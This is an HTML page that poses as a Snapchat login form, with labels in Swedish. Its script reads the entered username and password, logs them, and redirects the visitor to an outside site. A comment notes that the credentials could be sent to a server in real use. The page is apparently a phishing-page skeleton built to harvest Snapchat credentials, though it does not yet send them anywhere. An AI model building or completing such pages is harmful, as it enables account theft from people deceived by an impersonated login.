<!DOCTYPE html>
<html lang="en">
<head>
    <script>
        function handleSubmit(event) {
        event.preventDefault(); // Prevents the form from submitting

        // Retrieve username and password from the form
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;

        // Log the values (for demonstration purposes only)
        console.log('Username:', username);
        console.log('Password:', password);

        // Note: In a real application, you should never log or handle sensitive information like passwords in this way.
        // Implement proper authentication and security measures instead.
    }
    </script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            text-align: center;
            margin: 50px;
        }
        .login-container {
            max-width: 400px;
            margin: auto;
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            box-sizing: border-box;
        }
        button {
            background-color: #4caf50;
            color: #fff;
            padding: 10px 15px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Login</h2>
        <form action="#" method="post" onsubmit="handleSubmit(event)">
            <label for="username">Snapchat användarnamn:</label>
            <input type="text" id="username" name="username" required>

            <label for="password">Lösenord:</label>
            <input type="password" id="password" name="password" required>

            <button type="button" onclick="logAndRedirect()">Login</button>
        </form>
    </div>

    <script>
        function logAndRedirect() {
            // Retrieve entered username and password
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // Log the information (you can send it to a server instead in a real-world scenario)
            console.log('Username:', username);
            console.log('Password:', password);

            // Redirect to the earlier website
            window.location.href = 'https://kanintehittasidan.se';
        }
    </script>
</body>
</html>
